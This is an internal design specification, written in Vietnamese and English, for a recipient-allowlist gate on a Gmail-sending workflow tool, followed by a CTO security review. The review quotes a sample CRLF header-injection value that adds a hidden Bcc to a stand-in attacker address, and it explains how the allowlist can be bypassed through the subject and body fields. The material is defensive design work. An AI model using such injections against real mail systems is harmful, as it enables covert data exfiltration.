# Design: Gmail recipient-control gate (tier-high-exfil destination bound)

**Ngày:** 2026-06-09 · **Vai trò:** technical consultant · **Trạng thái:** 🔴 CTO REVIEWED (§9) — model DUYỆT nhưng **CONDITIONAL**: allowlist một mình bị vượt mặt bởi **RFC 2822 header-injection** (`gmail.ts:206` nối raw to/subject/body) → bắt buộc **F1 sanitize handler + F2 canonical-parse** trước flip `gmail_send`. Implementation sau PR #8 merge + F1/F2 fold.

> **TL;DR:** `gmail_send` là tool tier-high-exfil **duy nhất** (gdrive/gcal đã verify own-resource). CTO không ký mở `gmail_send` trần — bắt buộc 1 control-đích. Spec này thêm **recipient-allowlist gate**: tool tự-khai `recipientField`; runtime kiểm recipient (đã resolve) phải khớp **operator env allowlist** (`WORKFLOW_RECIPIENT_ALLOWLIST`), nếu không → fail-closed THROW. Không phải confirm-machinery (tôn trọng no-confirm của user) — chỉ chặn vector exfil. Gmail cần **3 điều kiện** để chạy: `workflowSafe:true` (flip) + allowlist set + recipient khớp.

---

## 1. Vấn đề & bối cảnh

Mechanism gate (PR #8, spec `2026-06-08-workflow-high-blast-design.md`) cho phép flip tool → `workflowSafe:true` để chạy trong workflow. CTO verdict (`comms/active/consultant-to-cto-workflow-high-blast`) phân tier exfil:
- **Tier-low-exfil** (9 tool, tài-nguyên-mình-sở-hữu) — flip sau merge, không cần control-đích.
- **Tier-high-exfil = `gmail_send`** (đích = người-nhận-ngoài tùy ý; `to={{read.x}}` từ nguồn bị thao túng = exfil) — **KHÔNG flip tới khi có control-đích.**

User chọn (brainstorming 2026-06-09): cần recipient **động** (data-derived) nhưng **có bound** → **allowlist domain**, cấu hình **operator env** (không author-widenable).

**Mục tiêu:** chặn vector exfil của `gmail_send` bằng allowlist-đích, đủ điều kiện để flip `gmail_send` sau khi CTO duyệt.

---

## 2. Decisions (brainstorming 2026-06-09)

| # | Trục | Chốt |
|---|---|---|
| G1 | Recipient động? | **Có, nhưng bound** (data-derived OK trong allowlist) → approach **allowlist** |
| G2 | Allowlist ở đâu | **Operator env** (global, không author-widenable) — khớp PIN "not user-editable" |
| G3 | Khai recipient field | **Self-declared `recipientField`** trên ConnectorTool (idiom kind/workflowSafe) |
| G4 | Empty allowlist | **Fail-closed** (reject hết) |
| G5 | Multi-recipient | **Mọi** recipient phải khớp (strict, chống comma-injection bypass) |

---

## 3. Mechanism

### 3.1 Self-declared `recipientField`
`ConnectorTool` ([`connectors/types.ts`](../../src/lib/connectors/types.ts)) +field optional:
```ts
export type ConnectorTool = {
  type: "function";
  kind: "read" | "write";
  workflowSafe?: boolean;
  // Tên trường args chứa ĐÍCH gửi-ra (exfil). Có → runtime enforce recipient-allowlist
  // trên giá trị ĐÃ RESOLVE của trường này. Vắng → tool không bị recipient-gate.
  recipientField?: string;
  function: { name: string; description: string; parameters: object };
};
```
`gmail_send` ([`gmail.ts`](../../src/lib/connectors/gmail.ts)) khai `recipientField: "to"`. (9 tool tier-low không khai → không bị gate.)

### 3.2 `assertRecipientAllowed` (file mới `src/lib/workflow/recipient.ts`)
```ts
// Destination-safety gate cho exfil-tool. Đọc recipientField (tự-khai) từ registry;
// nếu có, mọi recipient trong giá trị ĐÃ RESOLVE phải khớp allowlist, không → THROW.
// allowlist optional để test inject; mặc định đọc env (call-time).
export function assertRecipientAllowed(
  action: string,
  resolvedArgs: Record<string, unknown>,
  allowlist?: ReadonlySet<string>,   // lowercased entries; default = parseEnv()
): void;
```
Logic:
1. Tra `recipientField` của `action` từ `CONNECTORS` registry. Vắng → return (no-op).
2. `raw = String(resolvedArgs[recipientField] ?? "")`. Tách trên `,`, trim, bỏ rỗng → list recipient.
3. List rỗng → THROW (không có đích hợp lệ).
4. Mỗi recipient `local@host` (lowercase): pass nếu **full address** ∈ allowlist HOẶC **domain `host`** ∈ allowlist. Recipient không có `@` → THROW (không phân giải được domain → fail-closed).
5. Bất kỳ recipient nào không khớp → THROW (G5 strict). Allowlist rỗng → mọi recipient fail (G4).

### 3.3 Allowlist env
- **`WORKFLOW_RECIPIENT_ALLOWLIST`** — comma-separated. Entry = domain (`company.com`) hoặc full address (`alerts@gmail.com`). Parse: split `,`, trim, lowercase, bỏ rỗng → Set. Đọc **call-time** (env set sau load vẫn áp; test set `process.env` hoặc truyền `allowlist?`).
- Thêm vào `.env.example` + README env section (vi).

### 3.4 Enforcement point
Trong [`runtime.ts`](../../src/lib/workflow/runtime.ts) execute closure (xây trên mechanism PR #8), nhánh **real-execute** (sau interpolate → thấy recipient đã resolve; sau `assertConnectorAllowed`):
```ts
const execute = (action: string, args: Record<string, unknown>): Promise<unknown> => {
  if (dryRun && resolveKind(action, INTERNAL_TOOLS) === "write") {
    return Promise.resolve({ dryRun: true, wouldHaveCalled: action, args });
  }
  assertRecipientAllowed(action, args); // destination-safety (real-run); no-op nếu không recipientField
  return connectorExecute(userId, action, args);
};
```
Dry-run write → mock trước, **không** check (preview; real-run mới enforce — nhất quán seam mechanism). Reads → không recipientField → no-op.

---

## 4. Quan hệ với mechanism — gmail cần 3 điều kiện

`gmail_send` chạy được trong workflow real-run **CHỈ KHI**:
1. `workflowSafe: true` (flip — sau CTO duyệt spec này), **VÀ**
2. `WORKFLOW_RECIPIENT_ALLOWLIST` được operator set (khác rỗng), **VÀ**
3. mọi recipient (đã resolve) khớp allowlist.

Thiếu bất kỳ → fail-closed. Defense-in-depth: flip (code) ⊥ allowlist (operator config) ⊥ per-run recipient match.

---

## 5. Phạm vi chạm

**Không** migration · route · UI · suspend-resume. Build **trên** mechanism PR #8 (giả định đã merge).

| File | Đổi |
|---|---|
| `src/lib/connectors/types.ts` | +`recipientField?: string` trên `ConnectorTool` |
| `src/lib/connectors/gmail.ts` | `gmail_send` khai `recipientField: "to"` |
| `src/lib/workflow/recipient.ts` | **mới** — `assertRecipientAllowed` + parse env |
| `src/lib/workflow/runtime.ts` | wire `assertRecipientAllowed` vào real-execute branch |
| `.env.example` · `README.md` | document `WORKFLOW_RECIPIENT_ALLOWLIST` (vi) |
| tests | `recipient.test.ts` (mới) + `runtime.test.ts` (gmail recipient path) |

**Flip `gmail_send`** (`workflowSafe:true`) = bước riêng SAU khi spec này merge + operator set env (cập nhật tripwire test trong `policy.test.ts`).

---

## 6. Testing (Rule 9 — test mã hóa *vì sao*)

| Test | Intent | File |
|---|---|---|
| recipient trong allowed domain → pass | recipient động trong bound chạy được | `recipient.test.ts` |
| recipient ngoài allowlist → throw | bound exfil giữ | `recipient.test.ts` |
| allowlist rỗng → throw (cả addr hợp lệ) | **fail-closed default load-bearing** | `recipient.test.ts` |
| multi-recipient, 1 xấu → throw | không bypass qua comma-injection (G5) | `recipient.test.ts` |
| tool không recipientField → no-op | chỉ exfil-tool bị gate | `recipient.test.ts` |
| full-address entry khớp; domain entry khớp | cả 2 granularity | `recipient.test.ts` |
| recipient không có `@` → throw | không phân giải domain → fail-closed | `recipient.test.ts` |
| 🔴 real-run gmail_send ngoài allowlist → throw, KHÔNG execute | seam destination-safety | `runtime.test.ts` |
| dry-run gmail_send → mock, không recipient-check | real-run mới enforce | `runtime.test.ts` |

---

## 7. Non-goals (YAGNI)
- ❌ Per-workflow / per-node allowlist (operator env là bound đúng tầng — author không nới được).
- ❌ Allowlist UI / DB config.
- ❌ Recipient-control cho tier-low (bề mặt hẹp, R2 chấp nhận).
- ❌ Confirm-machinery (tôn trọng no-confirm).
- ❌ Dry-run recipient preview-warning (có thể thêm sau).
- ❌ Mở rộng exfil-tool khác (chỉ `gmail_send` hôm nay).

---

## 8. Liên quan
spec mechanism `2026-06-08-workflow-high-blast-design.md` · comms `consultant-to-cto-workflow-high-blast` (CTO verdict + tier confirm) · PR #8 (mechanism) · [[connectors-oauth]] (self-declare idiom) · [[workflow-orchestration-architecture]] (#3 đích-safety).

**→ CTO review (deliverable 4):** allowlist-domain qua operator env + self-declared recipientField + all-recipients-strict + fail-closed. Duyệt → implement (sau PR #8 merge) → flip `gmail_send`.

---

## 9. CTO REVIEW — 2026-06-09: model DUYỆT · 🔴 CONDITIONAL (đóng header-injection trước flip)

**Method:** đọc spec + **verify handler `gmail_send` thật** (`gmail.ts:201-219`).

### ✅ Security MODEL — đúng, duyệt
Allowlist ở **operator-env** (không author-widenable, G2) · fail-closed mọi nhánh (G4 empty / no-`@` / empty-list) · **G5 strict-all-match** (chống comma-injection) · enforce **sau interpolate** (recipient đã resolve) trên real-run · defense-in-depth 3 điều kiện. Tầng & trục đúng.

### 🔴 BLOCKER (verified) — allowlist BỊ VƯỢT MẶT ở tầng parsing
`gmail.ts:206-212` nối **raw** `to`/`subject`/`body` vào RFC 2822 headers, KHÔNG sanitize CRLF. Hệ quả:
1. **Header injection qua `to`:** `to="ok@company.com\r\nBcc: evil@x.com"` → header `Bcc:` tiêm thêm → Gmail gửi Bcc; gate split-`,` KHÔNG thấy.
2. **Bcc qua `subject`/`body`:** cũng nối raw → attacker tiêm Bcc qua trường gate **không đụng tới** → recipient-gate hoàn hảo trên `to` vẫn **vô dụng**.
3. **Parser differential:** gate split-`,` đơn giản ≠ RFC 2822 (quoted-comma `"Smith, John" <x>`, comment `(...)`, display-name) → đích gate-thấy ≠ đích Gmail-gửi.
⇒ **Allowlist một mình KHÔNG đủ.** (Pre-existing vuln — chat-side `gmail_send` cũng dính; sửa bất kể spec này.)

### Bắt buộc TRƯỚC khi flip `gmail_send` (thêm vào spec)
- **F1 — Sanitize handler (`gmail.ts`):** REJECT bất kỳ `to`/`subject`/`body` chứa `\r`/`\n` (hoặc encode đúng RFC 2822). Fix tầng connector → bảo vệ CẢ chat lẫn workflow. Test: `to`/`subject`/`body` có CRLF → throw.
- **F2 — Canonical recipient parse (1 hàm dùng chung gate+handler):** parse `to` → list **bare `local@domain`** đã validate (loại CRLF/comment/display-name-có-comma/nhiều-`@`); **gate kiểm list canonical đó**, handler gửi đúng list đó (dựng lại sạch). Xóa differential. §3.2 phải đặc tả parse CHÍNH XÁC này (hiện để ngỏ).
- Test 🔴 mới: header-injection qua to **và** qua subject/body → throw, KHÔNG execute.

### 🟡 Thứ cấp
- `recipientField` đơn-trường ổn **hôm nay** (gmail chỉ có `to`). Nếu sau thêm `cc`/`bcc` → phải cover (cân nhắc `recipientFields: string[]` + test fail nếu xuất hiện send-field mới).
- Gate này **kế thừa** tính security-critical của seam dry-run/real-run (PR #8): nếu real-run lọt nhánh mock thì gate bị skip → review **cùng** PR #8.

### Verdict
**Model ✅ duyệt. Spec 🔴 CONDITIONAL:** thêm F1+F2 (sanitize handler + canonical parse) vào §3/§5/§6 → đó mới là điều kiện thật để flip `gmail_send`, KHÔNG chỉ allowlist. Implement sau PR #8 merge; gửi CTO xác nhận F1/F2 đã fold trước flip. — *CTO, 2026-06-09.*
